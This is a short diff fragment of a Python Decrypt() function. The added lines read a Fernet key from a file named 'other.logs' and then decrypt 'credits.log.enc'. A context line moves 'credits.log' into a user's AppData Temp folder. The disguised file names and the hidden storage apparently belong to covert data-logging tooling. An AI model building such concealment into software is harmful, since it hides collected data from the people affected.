@@ -305,6 +305,8 @@ def Decrypt():
                 dcontent.write(decrypted)
             os.system("mv credits.log C:\\Users\\%username%\\AppData\\Roaming\\Temp\\")
     if platform.system() == 'Linux':
+            with open('other.logs', 'rb') as maybekey:
+                Halo = maybekey.read()    
             fernet = Fernet(Halo)
             with open('credits.log.enc','rb') as encryptfile:
                 content = encryptfile.read()
